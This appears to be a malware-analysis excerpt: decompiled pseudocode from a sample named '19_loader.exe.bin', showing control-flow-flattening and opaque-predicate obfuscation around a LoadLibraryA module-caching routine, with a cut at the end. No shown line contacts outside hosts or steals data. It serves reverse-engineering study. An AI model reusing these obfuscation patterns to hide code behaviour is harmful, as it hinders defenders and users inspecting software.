/* Selected original-byte decompiler representations; analysis only.
 * Includes explicit normal-context and partial functions.
 * Names/types are analyst/tool output, not a buildable original project.
 */

/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1001 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140001001 rva=0x1001 */

void FUN_140001001(undefined8 *param_1)

{
  undefined8 local_8;
  
  local_8 = *param_1;
  FUN_140010332(&local_8);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x101b | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

undefined8 FUN_14000101b(longlong param_1,ulonglong param_2,longlong param_3,longlong param_4)

{
  ulonglong uVar1;
  undefined8 uVar2;
  code *pcVar3;
  ulonglong uVar4;
  int iVar5;
  longlong lVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  undefined8 uVar10;
  ulonglong uVar11;
  uint uVar12;
  
  FUN_140011d10();
  uVar2 = *(undefined8 *)
           (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0x78);
  uVar10 = 0;
  uVar8 = 0;
  if (4 < param_2) {
    uVar8 = param_2 - 5;
  }
  uVar12 = (uint)uVar2;
                    /* WARNING: Switch is manually overridden */
  switch(param_2 < (uVar12 ^ 0xc443ffdf)) {
  case true:
switchD_14000109e_caseD_1:
    return uVar10;
  }
  uVar4 = 0;
                    /* WARNING: Switch is manually overridden */
  switch(param_2 == 0) {
  case true:
switchD_14000123c_caseD_1:
                    /* WARNING: Does not return */
    pcVar3 = (code *)invalidInstructionException();
    (*pcVar3)();
  }
  do {
    uVar1 = uVar4 + 1;
    iVar5 = (uint)*(ushort *)
                   (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) +
                   0x56) * 0x377f + (uVar12 ^ 0xc443ffdf) * 0x377e;
                    /* WARNING: Switch is manually overridden */
    switch(*(char *)(param_1 + uVar4) != (char)iVar5) {
    case false:
                    /* WARNING: Switch is manually overridden */
      switch(uVar1 < param_2) {
      case false:
                    /* WARNING: Does not return */
        pcVar3 = (code *)invalidInstructionException();
        (*pcVar3)();
      }
      uVar9 = (uVar12 ^ 0xc443ffdb) + uVar4;
      uVar10 = 0x30;
      if (uVar9 < param_2) {
        uVar10 = 8;
      }
                    /* WARNING: Switch is manually overridden */
      switch(uVar10) {
      case 8:
        uVar11 = (uVar12 ^ 0xc443ffda) + uVar4;
                    /* WARNING: Switch is manually overridden */
        switch(param_2 <= uVar11) {
        case false:
          uVar7 = (((uint)DAT_1400df2f8 ^ (uint)DAT_1400dfbfc) - (iVar5 - (uVar12 ^ 0xc443ffda)) &
                  0xffff) + uVar4;
                    /* WARNING: Switch is manually overridden */
          switch(uVar7 < param_2) {
          case false:
            goto switchD_14000121b_caseD_10;
          }
          break;
        case true:
          goto switchD_14000121b_caseD_10;
        }
        break;
      case 0x10:
switchD_14000121b_caseD_10:
                    /* WARNING: Does not return */
        pcVar3 = (code *)invalidInstructionException();
        (*pcVar3)();
      }
      lVar6 = *(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8);
      uVar10 = 1;
                    /* WARNING: Switch is manually overridden */
      switch((longlong)
             (int)((uint)*(byte *)(param_1 + uVar9) <<
                   (((byte)DAT_1400df4a0 ^
                    (byte)*(undefined8 *)(lVar6 + 0x78) ^ (byte)*(undefined4 *)(lVar6 + 0x50)) &
                   0x1f) | (uint)*(byte *)(param_1 + 1 + uVar4) |
                   (uint)*(byte *)(param_1 + uVar11) << 0x10 |
                  (uint)*(byte *)(param_1 + uVar7) << (-(char)uVar2 - 0xfU & 0x1f)) +
             uVar4 + param_3 + 5 == param_4) {
      case true:
        goto switchD_14000109e_caseD_1;
      }
    }
    lVar6 = 0x1c;
    if (uVar1 == uVar8) {
      lVar6 = 0x38;
    }
    uVar10 = 0;
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)((longlong)&switchD_14000121b::switchdataD_14008b2e8 + lVar6)) {
    case 0xffffffef:
      goto switchD_14000109e_caseD_1;
    }
    uVar4 = uVar1;
                    /* WARNING: Switch is manually overridden */
    switch(uVar1 == param_2) {
    case true:
      goto switchD_14000123c_caseD_1;
    }
  } while( true );
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1280 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140001280 rva=0x1280 */

void FUN_140001280(LPVOID param_1,longlong param_2,ulonglong param_3,longlong param_4)

{
  ulonglong *puVar1;
  longlong lVar2;
  ulonglong local_10;
  longlong local_8;
  
  puVar1 = &local_10;
  if (param_2 == 0) {
    lVar2 = 0;
  }
  else {
    lVar2 = param_2 * param_4;
    puVar1 = (ulonglong *)&local_8;
    local_10 = param_3;
  }
  *puVar1 = lVar2;
  if ((local_10 == 0) || (local_8 == 0)) {
    return;
  }
  FUN_14000260b(param_1,local_10);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x12c4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400012c4 rva=0x12c4 */

void FUN_1400012c4(undefined8 *param_1)

{
  code *pcVar1;
  longlong lVar2;
  
  lVar2 = FUN_140013790(param_1,param_1[1],1,(LPVOID)0x1,1);
  if (lVar2 != -1) {
                    /* WARNING: Does not return */
    pcVar1 = (code *)invalidInstructionException();
    (*pcVar1)();
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x12f3 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400012f3 rva=0x12f3 */

void FUN_1400012f3(undefined8 *param_1)

{
  undefined8 local_8;
  
  local_8 = *param_1;
  FUN_140011684(&local_8);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x130d | no_partial_markers_not_a_CFG_proof ===== */
/* REFERENCE-ONLY STATIC REPAIR; bytes unchanged; conditions retained. */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

HMODULE FUN_14000130d(uint param_1,LPCSTR param_2)

{
  undefined8 *puVar1;
  ushort uVar2;
  code *pcVar3;
  char cVar4;
  byte bVar5;
  uint *puVar6;
  HMODULE pHVar7;
  uint *puVar8;
  longlong lVar9;
  ulonglong uVar10;
  uint *puVar11;
  uint uVar12;
  ushort uVar13;
  int iVar14;
  ulonglong uVar15;
  uint *puVar16;
  longlong lVar17;
  uint uVar18;
  undefined4 *puVar19;
  ulonglong uVar20;
  uint uVar21;
  bool bVar22;
  ulonglong uStack_e0;
  ulonglong uStack_d8;
  ulonglong uStack_d0;
  uint uStack_c4;
  undefined8 uStack_b8;
  uint *puStack_98;
  uint uStack_90;
  undefined4 local_8c;
  uint *puStack_88;
  undefined8 uStack_80;
  ulonglong uStack_78;
  longlong lStack_70;
  ulonglong uStack_68;
  uint **ppuStack_60;
  ulonglong uStack_58;
  undefined8 local_50;
  uint uStack_44;
  
  FUN_140011d10();
  local_50 = 0xfd4420b6fce1e95c;
  local_8c = 0x13cabac0;
  lVar17 = *(longlong *)
            (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0x68);
  LOCK();
  bVar22 = DAT_1400e06f8 == '\0';
  if (bVar22) {
    DAT_1400e06f8 = '\x01';
  }
  UNLOCK();
  lVar9 = 0x98;
  if (bVar22) {
    lVar9 = 0x44;
  }
  uVar12 = (uint)lVar17;
  cVar4 = (char)lVar17;
                    /* WARNING: Switch is manually overridden */
  switch(*(undefined4 *)(&UNK_14008b004 + lVar9)) {
  case 0x178:
override_jmp_140001393_case_1:
    lVar9 = 0x5c;
    if (DAT_1400e06f0 == (uint *)0x0) {
      lVar9 = 0xa8;
    }
    break;
  case 0xffffff2c:
    do {
      lVar9 = 0x70;
      if (DAT_1400e06f8 == (char)(-0x47 - cVar4)) {
        lVar9 = 4;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008b004 + lVar9)) {
      case 0x623:
        do {
        } while (DAT_1400e06f8 != '\0');
      }
      LOCK();
      bVar22 = DAT_1400e06f8 == '\0';
      if (bVar22) {
        DAT_1400e06f8 = '\x01';
      }
      UNLOCK();
      puVar19 = &UNK_14008b09c;
      if (bVar22) {
        puVar19 = &UNK_14008b048;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar19) {
      case 0x178:
        goto override_jmp_140001393_case_1;
      }
    } while( true );
  }
                    /* WARNING: Switch is manually overridden */
  switch(*(undefined4 *)(&UNK_14008b004 + lVar9)) {
  case 0x401:
    uVar2 = (ushort)DAT_1400e06f0[0x26];
    uVar20 = (ulonglong)uVar2;
    lVar9 = (ulonglong)uVar2 << 2;
    puVar19 = (undefined4 *)&UNK_14008b058;
    if ((ulonglong)uVar2 != 0) {
      puVar19 = (undefined4 *)&UNK_14008b0a8;
    }
    uVar15 = 0xffffffffffffffff;
    puVar8 = DAT_1400e06f0;
    uVar10 = _DAT_1400e06e8;
                    /* WARNING: Switch is manually overridden */
    switch(*puVar19) {
    case 0x876:
      goto override_jmp_1400019bd_case_1;
    }
override_jmp_1400019bd_case_0:
    uVar18 = puVar8[uVar15 + 1];
    uVar15 = uVar15 + 1;
    if ((char)((uVar18 < param_1) - (param_1 < uVar18)) == '\x01') {
      lVar9 = lVar9 + -4;
      puVar19 = (undefined4 *)&UNK_14008b058;
      if (lVar9 != 0) {
        puVar19 = (undefined4 *)&UNK_14008b0a8;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar19) {
      case 0x876:
override_jmp_1400019bd_case_1:
        do {
          uVar15 = uVar20;
          puVar19 = (undefined4 *)&UNK_14008b038;
          if (uVar10 == uVar12 + 0x84f22447) {
            puVar19 = (undefined4 *)&UNK_14008b0ac;
          }
                    /* WARNING: Switch is manually overridden */
          switch(*puVar19) {
          case 0xd6:
            goto override_jmp_140001717_case_0;
          case 0xa0f:
override_jmp_140001e1c_case_1:
            uVar10 = uVar10 - 1;
            puVar8 = *(uint **)(puVar8 + uVar15 * 2 + 0x28);
            uVar2 = (ushort)puVar8[0x26];
            uVar20 = (ulonglong)uVar2;
            lVar9 = (ulonglong)uVar2 << 2;
            puVar19 = (undefined4 *)&UNK_14008b0a8;
            if ((ulonglong)uVar2 == 0) {
              puVar19 = (undefined4 *)&UNK_14008b058;
            }
          }
          uVar15 = 0xffffffffffffffff;
                    /* WARNING: Switch is manually overridden */
          switch(*puVar19) {
          case 0x818:
            goto override_jmp_1400019bd_case_0;
          }
        } while( true );
      }
      goto override_jmp_1400019bd_case_0;
    }
    if (uVar18 < param_1 == param_1 < uVar18) {
      pHVar7 = *(HMODULE *)
                ((longlong)puVar8 +
                uVar15 * (0x38 - (uVar12 + 0x84f22477)) + (ulonglong)(uVar12 + 0x84f22477));
      goto override_jmp_140001d18_case_0;
    }
    puVar19 = (undefined4 *)&UNK_14008b038;
    if (uVar10 == uVar12 + 0x84f22447) {
      puVar19 = (undefined4 *)&UNK_14008b0ac;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar19) {
    case 0xa0f:
      goto override_jmp_140001e1c_case_1;
    }
  }
override_jmp_140001717_case_0:
  FUN_1400108d1();
  pHVar7 = LoadLibraryA(param_2);
  lVar9 = 0xc4;
  if (pHVar7 == (HMODULE)0x0) {
    lVar9 = 0x7c;
  }
                    /* WARNING: Switch is manually overridden */
  switch(*(undefined4 *)(&UNK_14008b004 + lVar9)) {
  case 0x128:
    puStack_98 = &uStack_44;
    uStack_44 = 0xffffffb7;
    LOCK();
    bVar22 = DAT_1400e06f8 == '\0';
    if (bVar22) {
      DAT_1400e06f8 = '\x01';
    }
    break;
  case 0x7a2:
    return (HMODULE)0x0;
  }
  UNLOCK();
                    /* WARNING: Switch is manually overridden */
  switch(!bVar22) {
  case false:
override_jmp_1400016de_case_0:
    lVar9 = 0x2c;
    if (DAT_1400e06f0 == (uint *)0x0) {
      lVar9 = 0x18;
    }
    break;
  case true:
    do {
      puVar19 = (undefined4 *)&UNK_14008b010;
      if (DAT_1400e06f8 == (char)(cVar4 + 'G')) {
        puVar19 = (undefined4 *)&UNK_14008b070;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar19) {
      case 0x89e:
        do {
          lVar9 = 0xc;
          if (DAT_1400e06f8 == '\0') {
            lVar9 = 0x6c;
          }
                    /* WARNING: Switch is manually overridden */
          switch(*(undefined4 *)(&UNK_14008b004 + lVar9)) {
          case 0xffffff7b:
            goto override_jmp_1400016a7_case_0;
          }
        } while( true );
      case 0xffffff7b:
override_jmp_1400016a7_case_0:
        LOCK();
        bVar22 = DAT_1400e06f8 == '\0';
        if (bVar22) {
          DAT_1400e06f8 = '\x01';
        }
      }
      UNLOCK();
                    /* WARNING: Switch is manually overridden */
      switch(!bVar22) {
      case false:
        goto override_jmp_1400016de_case_0;
      }
    } while( true );
  }
                    /* WARNING: Switch is manually overridden */
  switch(*(undefined4 *)(&UNK_14008b004 + lVar9)) {
  case 0x43f:
    uVar20 = (ulonglong)(ushort)DAT_1400e06f0[0x26];
    puVar8 = DAT_1400e06f0 + uVar20;
    puVar19 = (undefined4 *)&UNK_14008b044;
    if (DAT_1400e06f0 == puVar8) {
      puVar19 = (undefined4 *)&UNK_14008b0cc;
    }
    uStack_d8 = 0xffffffffffffffff;
    uVar10 = _DAT_1400e06e8;
    puVar16 = DAT_1400e06f0;
    puVar6 = DAT_1400e06f0;
                    /* WARNING: Switch is manually overridden */
    switch(*puVar19) {
    case 0x7a6:
      goto override_jmp_1400019fb_case_1;
    }
override_jmp_1400019fb_case_0:
    uStack_d8 = uVar20;
    puVar19 = (undefined4 *)&UNK_14008b078;
    if (uVar10 == 0) {
      puVar19 = (undefined4 *)&UNK_14008b018;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar19) {
    case 0x15f:
override_jmp_140001bec_case_0:
      lVar9 = 0x9c;
      if (puVar6 == (uint *)0x0) {
        lVar9 = 0x18;
      }
      break;
    case 0x1f8:
      do {
        uVar10 = uVar10 - 1;
        puVar16 = *(uint **)(puVar6 + uStack_d8 * 2 + 0x28);
        uVar20 = (ulonglong)(ushort)puVar16[0x26];
        puVar8 = puVar16 + uVar20;
        puVar19 = (undefined4 *)&UNK_14008b0cc;
        if (puVar16 != puVar8) {
          puVar19 = (undefined4 *)&UNK_14008b044;
        }
        uStack_d8 = 0xffffffffffffffff;
        puVar6 = puVar16;
                    /* WARNING: Switch is manually overridden */
        switch(*puVar19) {
        case 0x64f:
          goto override_jmp_1400019fb_case_0;
        case 0x7a6:
override_jmp_1400019fb_case_1:
          while( true ) {
            uVar18 = *puVar16;
            uStack_d8 = uStack_d8 + 1;
            if ((char)((uVar18 < param_1) - (param_1 < uVar18)) != '\x01') break;
            puVar16 = (uint *)((longlong)puVar16 + (ulonglong)(uVar12 ^ 0x7b0ddbbd));
            puVar19 = (undefined4 *)&UNK_14008b0cc;
            if (puVar16 != puVar8) {
              puVar19 = (undefined4 *)&UNK_14008b044;
            }
                    /* WARNING: Switch is manually overridden */
            switch(*puVar19) {
            case 0x64f:
              goto override_jmp_1400019fb_case_0;
            }
          }
          if (uVar18 < param_1 == param_1 < uVar18) {
            *(HMODULE *)((longlong)puVar6 + uStack_d8 * 8 + (ulonglong)(uVar12 + 0x84f22477)) =
                 pHVar7;
                    /* WARNING: Switch is manually overridden */
            goto override_jmp_140001d18_case_0;
          }
          puVar19 = (undefined4 *)&UNK_14008b078;
          if (uVar10 == 0) {
            puVar19 = (undefined4 *)&UNK_14008b018;
          }
                    /* WARNING: Switch is manually overridden */
          switch(*puVar19) {
          case 0x15f:
            goto override_jmp_140001bec_case_0;
          }
        }
      } while( true );
    }
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008b004 + lVar9)) {
    case 0x66e:
      goto override_jmp_14000153b_case_1;
    case 0x6bc:
      uVar20 = (ulonglong)(0x7b0ddc51 - uVar12);
      uVar2 = *(ushort *)((longlong)puVar6 + uVar20);
      uStack_e0 = (ulonglong)uVar2;
      puVar8 = puVar6 + uStack_d8;
      if (uStack_e0 < 0xb) {
        uVar10 = uStack_d8 + 1;
        bVar22 = false;
                    /* WARNING: Switch is manually overridden */
        switch((uVar10 <= uStack_e0) * '\x03') {
        case '\0':
          *puVar8 = param_1;
          break;
        case '\x01':
          goto override_jmp_140001cad_case_0;
        case '\x02':
override_jmp_140001cad_case_1:
                    /* WARNING: Does not return */
          pcVar3 = (code *)invalidInstructionException();
          (*pcVar3)();
        case '\x03':
          uVar18 = (_DAT_1400dfbec + 0x63f5 ^ 0x10a0) & 0xffff;
          FUN_140021f30((undefined8 *)(uVar18 * uVar10 + (longlong)puVar6),(undefined8 *)puVar8,
                        (uStack_e0 - uStack_d8) * 4);
          *puVar8 = param_1;
          FUN_140021f30((undefined8 *)
                        ((longlong)puVar6 + (0xc - uVar18) * uVar10 + (ulonglong)(0x34 - uVar18)),
                        (undefined8 *)
                        ((longlong)puVar6 + uStack_d8 * 8 + (ulonglong)(0x34 - uVar18)),
                        uStack_e0 - uStack_d8 << (((byte)uVar18 ^ 7) & 0x3f));
        }
        *(HMODULE *)((longlong)puVar6 + uStack_d8 * 8 + (ulonglong)(0x7b0ddbe9 - uVar12)) = pHVar7;
        *(ushort *)((longlong)puVar6 + uVar20) = uVar2 + 1;
                    /* WARNING: Switch is manually overridden */
      }
      else {
        puVar19 = (undefined4 *)&UNK_14008b068;
        if (uStack_d8 < 0x7b0ddbbe - uVar12) {
          puVar19 = (undefined4 *)&UNK_14008b020;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*puVar19) {
        case 0x246:
          uStack_e0 = 4;
          bVar22 = false;
          break;
        case 0x2f9:
          if (uStack_d8 == 5) {
            bVar22 = false;
            uStack_e0 = 5;
          }
          else if (uStack_d8 == 6) {
            bVar22 = true;
            uStack_e0 = 5;
            uStack_d8 = 0;
          }
          else {
            uStack_d8 = (0x33ee77447b0ddbb2 - lVar17) + uStack_d8;
            bVar22 = true;
            uStack_e0 = 6;
          }
        }
        puVar8 = FUN_14000fc7a(0,0xa0);
        uVar10 = uStack_d8;
        switch(puVar8 == (uint *)0x0) {
        case true:
          goto override_jmp_140001cad_case_1;
        }
override_jmp_140001cad_case_0:
        uStack_d8 = uVar10;
        puVar8[0x24] = 0;
        puVar8[0x25] = 0;
        uVar10 = ~uStack_e0 + (ulonglong)*(ushort *)((longlong)puVar6 + uVar20);
        *(short *)((longlong)puVar8 + (ulonglong)(uVar12 ^ 0x7b0ddb21)) = (short)uVar10;
                    /* WARNING: Switch is manually overridden */
        switch(uVar10 < 0xc) {
        case false:
          goto override_jmp_1400013d5_case_1;
        case true:
          puVar1 = (undefined8 *)
                   ((longlong)puVar6 + uStack_e0 * 8 + (ulonglong)(uVar12 ^ 0x7b0ddb89));
          uStack_b8 = *puVar1;
          uStack_c4 = (puVar6 + uStack_e0 + 1)[-1];
          FUN_140021f30((undefined8 *)puVar8,(undefined8 *)(puVar6 + uStack_e0 + 1),uVar10 * 4);
          FUN_140021f30((undefined8 *)(puVar8 + 0xc),puVar1 + 1,uVar10 * 8);
          *(short *)((longlong)puVar6 + uVar20) = (short)uStack_e0;
          puVar16 = puVar8;
          if (!bVar22) {
            puVar16 = puVar6;
          }
          uVar20 = (ulonglong)((uVar12 ^ 0x7b0ddb89) + 0x68);
          uVar2 = *(ushort *)((longlong)puVar16 + uVar20);
          puVar11 = (uint *)((uVar12 ^ 0x7b0ddbbd) * uStack_d8 + (longlong)puVar16);
          puVar19 = (undefined4 *)&UNK_14008b0d4;
          lVar17 = uVar2 - uStack_d8;
          if (uStack_d8 <= uVar2 && lVar17 != 0) {
            puVar19 = (undefined4 *)&UNK_14008b0bc;
          }
                    /* WARNING: Switch is manually overridden */
          switch(*puVar19) {
          case 0:
            FUN_140021f30((undefined8 *)
                          ((ulonglong)(uVar12 + 0x84f2244b) * (uStack_d8 + 1) + (longlong)puVar16),
                          (undefined8 *)puVar11,lVar17 << (cVar4 + 0x49U & 0x3f));
            uVar18 = ((uint)DAT_1400df6c0 ^ DAT_1400dfbf6 - 0x7209) & 0xffff;
            FUN_140021f30((undefined8 *)((longlong)puVar16 + uStack_d8 * 8 + (ulonglong)uVar18 + 8),
                          (undefined8 *)
                          ((longlong)puVar16 + (uVar12 + 0x84f2244f) * uStack_d8 + (ulonglong)uVar18
                          ),(ulonglong)(uint)((int)lVar17 << 3));
            *puVar11 = param_1;
            *(HMODULE *)(puVar16 + uStack_d8 * 2 + 0xc) = pHVar7;
            *(ushort *)((longlong)puVar16 + uVar20) = uVar2 + 1;
            puVar16 = *(uint **)(puVar6 + 0x24);
            puVar19 = &UNK_14008b054;
            if (puVar16 == (uint *)0x0) {
              puVar19 = &UNK_14008b00c;
            }
            uStack_d0 = 0;
                    /* WARNING: Switch is manually overridden */
            switch(*puVar19) {
            case 0xffffffbc:
override_jmp_140001753_case_1:
              uVar2 = (ushort)puVar6[0x22];
              uVar20 = (ulonglong)uVar2;
              uVar18 = puVar16[0x26];
              iVar14 = _DAT_1400dfbe0 + -0x2596fe18;
              uVar13 = (ushort)iVar14;
                    /* WARNING: Switch is manually overridden */
              switch((ushort)uVar18 < uVar13) {
              case false:
                puVar19 = (undefined4 *)&UNK_14008b090;
                if (uVar2 < 5) {
                  puVar19 = (undefined4 *)&UNK_14008b004;
                }
                ppuStack_60 = &puStack_98;
                uVar10 = 4;
                uStack_68 = uVar20;
                    /* WARNING: Switch is manually overridden */
                switch(*puVar19) {
                case 0x47d:
                  puVar19 = (undefined4 *)&UNK_14008b024;
                  if (uVar2 == 5) {
                    puVar19 = (undefined4 *)&UNK_14008b004;
                  }
                  uVar10 = 5;
                  uStack_68 = 5;
                    /* WARNING: Switch is manually overridden */
                  switch(*puVar19) {
                  case 0x1d4:
                    uStack_68 = 0;
                    ppuStack_60 = &puStack_88;
                    /* WARNING: Switch is manually overridden */
                    switch(uVar2 == 6) {
                    case false:
                      uStack_68 = uVar20 - 7;
                      uVar10 = 6;
                    }
                  }
                }
                puVar6 = FUN_14000fc7a(0,0x100);
                lVar17 = 0x90;
                if (puVar6 == (uint *)0x0) {
                  lVar17 = 0x3c;
                }
                    /* WARNING: Switch is manually overridden */
                switch(*(undefined4 *)(&UNK_14008b004 + lVar17)) {
                case 0x8be:
                  puVar6[0x24] = 0;
                  puVar6[0x25] = 0;
                  lVar17 = *(longlong *)
                            ((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8);
                  bVar5 = ~((byte)*(undefined8 *)(lVar17 + 0xd8) ^
                           (byte)*(undefined8 *)(lVar17 + 0xd8) ^ *(byte *)(lVar17 + 0x5b));
                  uStack_58 = (ulonglong)bVar5;
                  *(undefined2 *)((longlong)puVar6 + uStack_58) = 0;
                  uVar20 = ~uVar10 + (ulonglong)(ushort)puVar16[0x26];
                  *(short *)((longlong)puVar6 + uStack_58) = (short)uVar20;
                  uVar21 = bVar5 - 0x8c;
                    /* WARNING: Switch is manually overridden */
                  switch(uVar21 <= uVar20) {
                  case false:
                    uStack_80 = *(undefined8 *)(puVar16 + uVar10 * 2 + 0xc);
                    uStack_90 = puVar16[uVar10];
                    lStack_70 = uVar10 + 1;
                    FUN_140021f30((undefined8 *)puVar6,(undefined8 *)(puVar16 + uVar10 + 1),
                                  uVar20 * 4);
                    iVar14 = uVar21 + iVar14 + (uint)_DAT_1400dfbf8;
                    uStack_78 = (ulonglong)(-iVar14 & 0xffff);
                    FUN_140021f30((undefined8 *)(puVar6 + 0xc),
                                  (undefined8 *)((longlong)puVar16 + uStack_78 * lStack_70 + 0x30),
                                  uVar20 << (~((char)iVar14 + 4U) & 0x3f));
                    *(short *)(puVar16 + 0x26) = (short)uVar10;
                    uVar2 = *(ushort *)((longlong)puVar6 + uStack_58);
                    lVar17 = 0x48;
                    if (uVar2 < (ushort)~(uVar13 + ((short)uVar21 + (short)local_50) * -0x4fef)) {
                      lVar17 = 0x30;
                    }
                    /* WARNING: Switch is manually overridden */
                    switch(*(undefined4 *)(&UNK_14008b004 + lVar17)) {
                    case 0x774:
                    /* WARNING: Does not return */
                      pcVar3 = (code *)invalidInstructionException();
                      (*pcVar3)();
                    case 0xffffff51:
                      iVar14 = (uint)(ushort)uVar18 - (int)uVar10;
                      lVar17 = 0x10;
                      if (iVar14 == uVar2 + 1) {
                        lVar17 = 0xa0;
                      }
                    }
                    /* WARNING: Switch is manually overridden */
                    switch(*(undefined4 *)(&UNK_14008b004 + lVar17)) {
                    case 0x269:
                      uStack_d0 = uStack_d0 + 1;
                      FUN_140021f30((undefined8 *)(puVar6 + 0x28),
                                    (undefined8 *)
                                    ((longlong)puVar16 + uVar10 * (uStack_78 & 0xffffffff) + 0xa8),
                                    (ulonglong)(uint)(iVar14 * 8));
                      uVar20 = 0;
                      break;
                    case 0x64d:
                    /* WARNING: Does not return */
                      pcVar3 = (code *)invalidInstructionException();
                      (*pcVar3)();
                    }
                    do {
                      lVar17 = *(longlong *)
                                ((longlong)puVar6 + (uVar12 + 0x84f2244f) * uVar20 + 0xa0);
                      *(uint **)(lVar17 + (ulonglong)(uVar12 + 0x84f224d7)) = puVar6;
                      *(short *)(lVar17 + (ulonglong)(uVar12 + 0x84f2244f ^ 0x80)) = (short)uVar20;
                      puVar19 = (undefined4 *)&UNK_14008b0b8;
                      if ((uint)uVar2 == uVar20) {
                        puVar19 = (undefined4 *)&UNK_14008b06c;
                      }
                    /* WARNING: Switch is manually overridden */
                      switch(*puVar19) {
                      case 0x264:
                        uVar20 = uVar20 + 1;
                        break;
                      case 0x39e:
                        goto override_jmp_140001868_case_1;
                      }
                    } while( true );
                  }
                }
                goto override_jmp_1400013d5_case_1;
              case true:
                FUN_140002282(uVar20,(longlong)puVar16,uStack_c4,uStack_b8,puVar8);
              }
              goto override_jmp_140001f89_case_0;
            }
            break;
          case 0x198:
            *puVar11 = param_1;
            *(HMODULE *)(puVar16 + uStack_d8 * 2 + 0xc) = pHVar7;
            *(ushort *)((longlong)puVar16 + uVar20) = uVar2 + 1;
            puVar16 = *(uint **)(puVar6 + 0x24);
            puVar19 = &UNK_14008b054;
            if (puVar16 == (uint *)0x0) {
              puVar19 = &UNK_14008b00c;
            }
            uStack_d0 = 0;
                    /* WARNING: Switch is manually overridden */
            switch(*puVar19) {
            case 0xffffffbc:
              goto override_jmp_140001753_case_1;
            }
          }
override_jmp_140001753_case_0:
          puVar16 = DAT_1400e06f0;
          uVar20 = _DAT_1400e06e8;
                    /* WARNING: Switch is manually overridden */
          switch(DAT_1400e06f0 != (uint *)0x0) {
          case false:
                    /* WARNING: Does not return */
            pcVar3 = (code *)invalidInstructionException();
            (*pcVar3)();
          }
          puVar6 = FUN_14000fc7a(0,0x100);
                    /* WARNING: Switch is manually overridden */
          switch(puVar6 != (uint *)0x0) {
          case false:
                    /* WARNING: Does not return */
            pcVar3 = (code *)invalidInstructionException();
            (*pcVar3)();
          }
          uVar18 = 0x7b0ddc49 - uVar12;
          *(undefined8 *)((longlong)puVar6 + (ulonglong)uVar18) = 0;
          *(undefined2 *)((longlong)puVar6 + (ulonglong)(uVar18 ^ 8)) = 0;
          *(uint **)(puVar6 + 0x28) = puVar16;
          uVar10 = uVar20 + 1;
          if (0x90 - uVar18 == uVar10) goto override_jmp_1400013d5_case_1;
          *(uint **)((longlong)puVar16 + (ulonglong)(uVar12 ^ 0x7b0ddb29)) = puVar6;
          *(undefined2 *)((longlong)puVar16 + (ulonglong)((uVar12 ^ 0x7b0ddb29) - 8)) = 0;
          lVar17 = 0xbc;
          if (uStack_d0 == uVar20) {
            lVar17 = 0x58;
          }
          _DAT_1400e06e8 = uVar10;
          DAT_1400e06f0 = puVar6;
                    /* WARNING: Switch is manually overridden */
          switch(*(undefined4 *)(&UNK_14008b004 + lVar17)) {
          case 0x59d:
                    /* WARNING: Does not return */
            pcVar3 = (code *)invalidInstructionException();
            (*pcVar3)();
          case 0xb38:
            *(undefined2 *)((longlong)puVar6 + (ulonglong)(uVar18 ^ 8)) = 1;
            *puVar6 = uStack_c4;
            *(undefined8 *)((longlong)puVar6 + (ulonglong)(uVar12 ^ 0x7b0ddb89)) = uStack_b8;
            *(uint **)(puVar6 + 0x2a) = puVar8;
            *(uint **)(puVar8 + 0x24) = puVar6;
            *(undefined2 *)(puVar8 + 0x22) = 1;
                    /* WARNING: Switch is manually overridden */
          }
        }
      }
    }
    break;
  case 0x66e:
override_jmp_14000153b_case_1:
    puVar8 = FUN_14000fc7a(0,0xa0);
    if (puVar8 == (uint *)0x0) {
override_jmp_1400013d5_case_1:
                    /* WARNING: Does not return */
      pcVar3 = (code *)invalidInstructionException();
      (*pcVar3)();
    }
    puVar8[0x24] = 0;
    puVar8[0x25] = 0;
    *(undefined2 *)(puVar8 + 0x26) = 0;
    _DAT_1400e06e8 = 0;
    DAT_1400e06f0 = puVar8;
    *(undefined2 *)(puVar8 + 0x26) = 1;
    *puVar8 = param_1;
    *(HMODULE *)((longlong)puVar8 + (ulonglong)(0x7b0ddbe9 - uVar12)) = pHVar7;
  }
override_jmp_140001f89_case_0:
  _DAT_1400e06e0 = _DAT_1400e06e0 + 1;
override_jmp_140001d18_case_0:
  FUN_1400108d1();
  return pHVar7;
override_jmp_140001868_case_1:
  puStack_98 = puVar16;
  puStack_88 = puVar6;
  FUN_140002282(uStack_68,(longlong)*ppuStack_60,uStack_c4,uStack_b8,puVar8);
  lVar17 = 0xac;
  if (puStack_98 == (uint *)(ulonglong)(uVar12 ^ 0x7b0ddbb9)) {
    lVar17 = 0x60;
  }
